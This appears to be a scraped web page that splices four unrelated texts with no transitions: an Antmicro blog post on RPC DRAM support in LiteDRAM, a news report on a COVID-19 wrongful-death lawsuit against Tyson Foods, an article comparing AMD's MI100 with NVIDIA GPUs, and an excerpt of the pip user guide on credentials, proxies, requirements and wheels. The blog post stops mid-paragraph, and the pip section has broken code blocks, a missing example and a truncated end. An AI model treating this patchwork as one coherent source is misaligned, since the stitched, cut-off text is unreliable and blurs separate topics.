<p>Standard modern DRAM chips, with their small but not miniscule footprints and rather high I/O requirements, are impossible to use in space-constrained applications. By using a large number of pins in the device they connect to, they can also push the envelope of the device itself even more, requiring larger and more expensive packages of the FPGA or SoC used. <br>
And while many edge devices could easily do with a smaller amount (e.g. sub-1Gb) of RAM than what modern memory parts offer, it is impossible to cut a RAM chip in half and get less memory capacity. Well, at least until now - kind of.</p>

<p>The so-called RPC (Reduced Pin Count) DRAM - a new technology from Etron - has the potential to profoundly impact the AI, IoT and VR/AR markets. It is a tiny memory chip family which can get as small as 1.96mm x 4.63mm, offering 256Mbits and high bandwidth (the same as DDR3) using only 10% of the DDR3 PCB area and only half of the SoC or FPGA pins that the DDR3 memory takes up. Its clock speed can go up to 1200MHz, with bandwidth of up to 4800 Mb/s.</p>

<p><img src="https://antmicro.com/blog/images/LiteDRAM_with_RPC_RAM_blog-note.png" alt="DDR RAM and RPC DRAM comparison"></p>

<p>RPC DRAM is ideal for space-constrained edge AI applications that locally process data such as video, audio or image, where, apart from space saving, low power consumption is critical. The small number of pins used by RPC DRAM leaves more available resources for other system functionalities, while the possibility of stacking multiple RPC DRAM chips on top of one another for further layout optimization makes the technology even more appealing. It also enables interesting scenarios like <a href="https://antmicro.com/blog/2020/10/open-chiplet-initiative/#future-developments">embedding in a chiplet-based SiP</a>, or even bare-die integration with small FPGAs for a powerful, Linux-capable device. But to use the memory with FPGAs, you need to interface with it using a DRAM controller - and that is where our latest work with LiteDRAM comes in.</p>

<h3 id="litedram-and-open-source-ip-ecosystem">LiteDRAM and open source IP ecosystem</h3>

<p>LiteDRAM is a configurable memory controller that is part of LiteX, an open source SoC builder that we are developing and using to design FPGA-based systems. By creating support for RPC DRAM in LiteDRAM we have enabled the miniscule memory to be added to products that we build and to the whole LiteX ecosystem. This enables our customer’s devices to run more compute-hungry applications or full-fledged operating systems such as Linux in dedicated SoCs created by Antmicro on demand.</p>

<p>We use and contribute to LiteDRAM, LiteX and other open source IP to develop unique designs interfaced with DDR memories for high-bandwidth video and other data processing systems; and RPC DRAM support is just one example of the enablement work we are performing in the ecosystem. Combined with the exciting work related to open source we are performing as part of <a href="https://antmicro.com/blog/2020/07/swerv-cores-tools-ecosystem/">CHIPS Alliance</a>, <a href="https://antmicro.com/blog/2020/06/skywater-open-source-pdk/">SkyWater PDK</a> and the fantastic enregy catalyzed by the open <a href="https://antmicro.com/technologies/risc-v/">RISC-V</a> CPU architecture (which is an obvious candidate for combining with RPC RAM both in soft- and hard CPU contexts), future is looking bright for tiny, open, ML-capable systems.</p>

<h3 id="antmicros-open-source-fpga-ip">Antmicro’s open source FPGA IP</h3>

<p>We often use FPGAs to build a wide array of configurable systems for our customers, leveraging the flexibility and customizability that this technology offers. We create open source FPGA IPs that are reusable across various designs and platforms without any licensing restrictions imposed on our customers. Antmicro’s open source IP cores portfolio includes MIPI CSI, MIDI, PCIe, USB, Ethernet etc.</p>

<p>The FPGA systems that we build consist of modern, vendor-neutral components that ensure future-proofness and give our clients full control over the product.

        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content-area">
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/48301387cddb344c254ee94cde7f04d7/p/uploads/2020/11/db6591d4-1.png" alt="" width="700" height="313"></p>
<p>With the rising demand for HPC and AI-powered cloud applications comes a need for very powerful datacenter GPUs. Usually NVIDIA is the king of this field, but AMD’s latest MI100 GPU presents some serious competition.</p>
<h2 role="heading" aria-level="2">A Card For The HPC Market</h2>
<p>The card is fast, seriously fast. NVIDIA’s high end A100 GPU peaks at&nbsp;9.7 TFLOPS in FP64 workloads. The new “AMD Instinct MI100” leaps past that at 11.5 TFLOPS.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/2f6292f97a12046b544017f07246a4f8/p/uploads/2020/11/8d6e8097.png" alt="" width="700" height="312"></p>
<p>Of course, NVIDIA’s cards support other speedup techniques for AI-specific workloads in different number formats, such as the TensorFloat-32 precision format and<a href="https://www.cloudsavvyit.com/4796/nvidias-new-ampere-gpu-is-a-game-changer-for-artificial-intelligence/"> fine-grained structured sparsity</a>. For AI and Machine Learning workloads, NVIDIA is still king, as their cards are built specifically for tensor-based operations.</p>
<p>But, for general purpose High Performance Computing, the MI100 takes the crown for raw compute power. Plus, it’s nearly half the price, and is much more efficient per watt.</p>
<p>On top of the other improvements, the new architecture also brings mixed-precision improvements, with their “Matrix Core” technology delivering 7x greater FP16 performance compared to their prior generation of cards.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/6588bb99d6c97c60163b08630e9b8d86/p/uploads/2020/11/292c692b.png" alt="" width="700" height="216"></p>
<p>AMD CPUs and Instinct GPUS are <a href="https://www.olcf.ornl.gov/frontier/">both powering two of the US Department of Energy’s exascale supercomputers</a>. The “Frontier” supercomputer is planned to be built next year with current Epyc CPUs and MI100s, and will deliver more than 1.5 exaflops of peak computing power. The “El Capitan” supercomputer is planned to be built in 2023 on next gen hardware, and will deliver more than 2 exaflops of double precision power.</p>
<h2 role="heading" aria-level="2">Can ROCm Live Up to CUDA?</h2>
<p>Of course, all of this power is useless if the software doesn’t support it. It’s no secret that NVIDIA has managed to make machine learning a bit of a walled garden.</p>
<p>NVIDIA’s compute framework is called <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a>, or&nbsp;Compute Unified Device Architecture. It’s proprietary, and only works with their cards. But since their cards have historically been the fastest, many applications are only built with CUDA support first and foremost.</p>
<p>There are cross-platform programming models, most notably OpenCL, which AMD supports very well <a href="https://rocmdocs.amd.com/en/latest/">with their ROCm platform</a>. Both NVIDIA cards and AMD cards support OpenCL, but because NVIDIA only supports it by transpiling to CUDA, it’s actually slower to use OpenCL with an NVIDIA card. Because of this, not all applications will support it.</p>
<p>Ultimately, you’ll need to do your own research and see if the application you intend to run can be run on AMD cards, and maybe be prepared for some tinkering and bug fixing. NVIDIA GPUs on the otherhand are mostly plug and play, so even if AMD is faster, NVIDIA can continue to hinder them with closed-source software.</p>
<p>However, this situation is getting better—AMD is committed to open sourcing everything and creating an open environment. Tensorflow and PyTorch, two very popular ML frameworks, both support the ROCm ecosystem.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/03aae3c52689bd7fd58e8278df8fefac/p/uploads/2020/11/301c98b9.png" alt="" width="697" height="479"></p>
<p>Hopefully the raw specs of AMD’s latest offerings can push the industry to a more competitive environment. After all, they’re being put to use in supercomputers</p>

<h2>Running pip<a href="#running-pip" title="Permalink to this headline">¶</a></h2>
<p>pip is a command line program. When you install pip, a <code><span>pip</span></code> command is added
to your system, which can be run from the command prompt as follows:</p>
<div>
<p><label for="tab-set--0-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>python</span> <span>-m</span> <span>pip</span></code> executes pip using the Python interpreter you
specified as python. So <code><span>/usr/bin/python3.7</span> <span>-m</span> <span>pip</span></code> means
you are executing pip for your interpreter located at /usr/bin/python3.7.</p>
</div>
<p><label for="tab-set--0-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>py</span> <span>-m</span> <span>pip</span></code> executes pip using the latest Python interpreter you
have installed. For more details, read the <a href="https://docs.python.org/3/using/windows.html#launcher">Python Windows launcher</a> docs.</p>
</div>
</div>

<div id="installing-packages">
<h2>Installing Packages<a href="#installing-packages" title="Permalink to this headline">¶</a></h2>
<p>pip supports installing from <a href="https://pypi.org/">PyPI</a>, version control, local projects, and
directly from distribution files.</p>
<p>The most common scenario is to install from <a href="https://pypi.org/">PyPI</a> using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirement-specifiers"><span>Requirement Specifiers</span></a></p>

</div>
<div id="basic-authentication-credentials">
<h2>Basic Authentication Credentials<a href="#basic-authentication-credentials" title="Permalink to this headline">¶</a></h2>
<p>pip supports basic authentication credentials. Basically, in the URL there is
a username and password separated by <code><span>:</span></code>.</p>
<p><code><span>https://[username[:password]@]pypi.company.com/simple</span></code></p>
<p>Certain special characters are not valid in the authentication part of URLs.
If the user or password part of your login credentials contain any of the
special characters
<a href="https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters">here</a>
then they must be percent-encoded. For example, for a
user with username “user” and password “he//o” accessing a repository at
pypi.company.com, the index URL with credentials would look like:</p>
<p><code><span>https://user:he%2F%2Fo@pypi.company.com</span></code></p>
<p>Support for percent-encoded authentication in index URLs was added in pip 10.0.0
(in <a href="https://github.com/pypa/pip/issues/3236">#3236</a>). Users that must use authentication
for their Python repository on systems with older pip versions should make the latest
get-pip.py available in their environment to bootstrap pip to a recent-enough version.</p>
<p>For indexes that only require single-part authentication tokens, provide the token
as the “username” and do not provide a password, for example -</p>
<p><code><span>https://0123456789abcdef@pypi.company.com</span></code></p>
<div id="netrc-support">
<h3>netrc Support<a href="#netrc-support" title="Permalink to this headline">¶</a></h3>
<p>If no credentials are part of the URL, pip will attempt to get authentication credentials
for the URL’s hostname from the user’s .netrc file. This behaviour comes from the underlying
use of <a href="https://requests.readthedocs.io/en/master/user/authentication/#netrc-authentication">requests</a> which in turn delegates it to the <a href="https://docs.python.org/3/library/netrc.html">Python standard library</a>.</p>
<p>The .netrc file contains login and initialization information used by the auto-login process.
It resides in the user’s home directory. The .netrc file format is simple. You specify lines
with a machine name and follow that with lines for the login and password that are
associated with that machine. Machine name is the hostname in your URL.</p>
<p>An example .netrc for the host example.com with a user named ‘daniel’, using the password
‘qwerty’ would look like:</p>
<div><div><pre><span></span>machine example.com
login daniel
password qwerty
</pre></div>
</div>
<p>As mentioned in the <a href="https://docs.python.org/3/library/netrc.html">standard library docs</a>,
only ASCII characters are allowed. Whitespace and non-printable characters are not allowed in passwords.</p>
</div>
<div id="keyring-support">
<h3>Keyring Support<a href="#keyring-support" title="Permalink to this headline">¶</a></h3>
<p>pip also supports credentials stored in your keyring using the <a href="https://pypi.org/project/keyring/">keyring</a>
library. Note that <code><span>keyring</span></code> will need to be installed separately, as pip
does not come with it included.</p>
<div><div><pre><span></span>pip install keyring
<span>echo</span> your-password <span>|</span> keyring <span>set</span> pypi.company.com your-username

<div id="using-a-proxy-server">
<h2>Using a Proxy Server<a href="#using-a-proxy-server" title="Permalink to this headline">¶</a></h2>
<p>When installing packages from <a href="https://pypi.org/">PyPI</a>, pip requires internet access, which
in many corporate environments requires an outbound HTTP proxy server.</p>
<p>pip can be configured to connect through a proxy server in various ways:</p>
<ul>
<li><p>using the <code><span>--proxy</span></code> command-line option to specify a proxy in the form
<code><span>[user:passwd@]proxy.server:port</span></code></p></li>
<li><p>using <code><span>proxy</span></code> in a <a href="#config-file"><span>Config file</span></a></p></li>
<li><p>by setting the standard environment-variables <code><span>http_proxy</span></code>, <code><span>https_proxy</span></code>
and <code><span>no_proxy</span></code>.</p></li>
<li><p>using the environment variable <code><span>PIP_USER_AGENT_USER_DATA</span></code> to include
a JSON-encoded string in the user-agent variable used in pip’s requests.</p></li>
</ul>
</div>
<div id="requirements-files">
<h2>Requirements Files<a href="#requirements-files" title="Permalink to this headline">¶</a></h2>
<p>“Requirements files” are files containing a list of items to be
installed using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> like so:</p>
<div>
<p><label for="tab-set--2-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--2-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>Details on the format of the files are here: <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a>.</p>
<p>Logically, a Requirements file is just a list of <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> arguments
placed in a file. Note that you should not rely on the items in the file being
installed by pip in any particular order.</p>
<p>In practice, there are 4 common uses of Requirements files:</p>
<ol>
<li><p>Requirements files are used to hold the result from <a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a> for the
purpose of achieving <a href="#repeatability"><span>repeatable installations</span></a>.  In
this case, your requirement file contains a pinned version of everything that
was installed when <code><span>pip</span> <span>freeze</span></code> was run.</p>

<li><p>Requirements files are used to force pip to properly resolve dependencies.
pip 20.2 and earlier <a href="https://github.com/pypa/pip/issues/988">doesn’t have true dependency resolution</a>, but instead simply uses the first
specification it finds for a project. E.g. if <code><span>pkg1</span></code> requires
<code><span>pkg3&gt;=1.0</span></code> and <code><span>pkg2</span></code> requires <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code>, and if <code><span>pkg1</span></code> is
resolved first, pip will only use <code><span>pkg3&gt;=1.0</span></code>, and could easily end up
installing a version of <code><span>pkg3</span></code> that conflicts with the needs of <code><span>pkg2</span></code>.
To solve this problem, you can place <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code> (i.e. the correct
specification) into your requirements file directly along with the other top
level requirements. Like so:</p>
<div><div><pre><span></span><span>pkg1</span>
<span>pkg2</span>
<span>pkg3</span><span>&gt;=</span><span>1.0</span><span>,</span><span>&lt;=</span><span>2.0</span>
</pre></div>
</div>
</li>
<li><p>Requirements files are used to force pip to install an alternate version of a
sub-dependency.  For example, suppose <code><span>ProjectA</span></code> in your requirements file
requires <code><span>ProjectB</span></code>, but the latest version (v1.3) has a bug, you can force
pip to accept earlier versions like so:</p>

</li>
<li><p>Requirements files are used to override a dependency with a local patch that
lives in version control.  For example, suppose a dependency
<code><span>SomeDependency</span></code> from PyPI has a bug, and you can’t wait for an upstream
fix.
You could clone/copy the src, make the fix, and place it in VCS with the tag
<code><span>sometag</span></code>.  You’d reference it in your requirements file with a line like
so:</p>
<div><div><pre><span></span><span>git</span><span>+</span><span>https</span><span>:</span><span>//</span><span>myvcs</span><span>.</span><span>com</span><span>/</span><span>some_dependency</span><span>@sometag</span><span>#egg=SomeDependency</span>
</pre></div>
</div>
<p>If <code><span>SomeDependency</span></code> was previously a top-level requirement in your
requirements file, then <strong>replace</strong> that line with the new line. If
<code><span>SomeDependency</span></code> is a sub-dependency, then <strong>add</strong> the new line.</p>
</li>
</ol>
<p>It’s important to be clear that pip determines package dependencies using
<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#declaring-dependencies">install_requires metadata</a>,
not by discovering <code><span>requirements.txt</span></code> files embedded in projects.</p>

<div id="constraints-files">
<h2>Constraints Files<a href="#constraints-files" title="Permalink to this headline">¶</a></h2>
<p>Constraints files are requirements files that only control which version of a
requirement is installed, not whether it is installed or not. Their syntax and
contents is nearly identical to <a href="#requirements-files"><span>Requirements Files</span></a>. There is one key
difference: Including a package in a constraints file does not trigger
installation of the package.</p>
<p>Use a constraints file like so:</p>
<div>
<p><label for="tab-set--4-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -c constraints.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--4-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -c constraints.txt
</pre></div>
</div>
</div>
</div>
<p>Constraints files are used for exactly the same reason as requirements files
when you don’t know exactly what things you want to install. For instance, say
that the “helloworld” package doesn’t work in your environment, so you have a
local patched version. Some things you install depend on “helloworld”, and some
don’t.</p>
<p>One way to ensure that the patched version is used consistently is to
manually audit the dependencies of everything you install, and if “helloworld”
is present, write a requirements file to use when installing that thing.</p>
<p>Constraints files offer a better way: write a single constraints file for your
organisation and use that everywhere. If the thing being installed requires
“helloworld” to be installed, your fixed version specified in your constraints
file will be used.</p>
<p>Constraints file support was added in pip 7.1. In <a href="#resolver-changes-2020"><span>Changes to the pip dependency resolver in 20.3 (2020)</span></a> we did a fairly comprehensive overhaul, removing several
undocumented and unsupported quirks from the previous implementation,
and stripped constraints files down to being purely a way to specify
global (version) limits for packages.</p>
</div>
<div id="installing-from-wheels">
<h2>Installing from Wheels<a href="#installing-from-wheels" title="Permalink to this headline">¶</a></h2>
<p>“Wheel” is a built, archive format that can greatly speed installation compared
to building and installing from source archives. For more information, see the
<a href="https://wheel.readthedocs.io/">Wheel docs</a> , <span id="index-0"></span><a href="https://www.python.org/dev/peps/pep-0427"><strong>PEP 427</strong></a>, and <span id="index-1"></span><a href="https://www.python.org/dev/peps/pep-0425"><strong>PEP 425</strong></a>.</p>
<p>pip prefers Wheels where they are available. To disable this, use the
<a href="https://pip.pypa.io/en/latest/reference/pip_install/#install-no-binary"><span>--no-binary</span></a> flag for <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a>.</p>
<p>If no satisfactory wheels are found, pip will default to finding source
archives.</p>
<p>To install directly from a wheel archive:</p>
<div>
<p><label for="tab-set--5-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
<p><label for="tab-set--5-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
</div>
<p>For the cases where wheels are not available, pip offers <a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> as a
convenience, to build wheels for all your requirements and dependencies.</p>
<p><a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> requires the <a href="https://pypi.org/project/wheel/">wheel package</a> to be installed, which provides the
“bdist_wheel” setuptools extension that it uses.</p>
<p>To build wheels for your requirements and all their dependencies to a local
directory:</p>
<div>
<p><label for="tab-set--6-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install wheel
python -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--6-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install wheel
py -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>And <em>then</em> to install those requirements just using your local directory of
wheels (and not from PyPI):</p>
<div>
<p><label for="tab-set--7-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install --no-index --find-links<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--7-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install --no-index --find-links<span>=</span>…</pre></div></div></div></div></div></div></div>
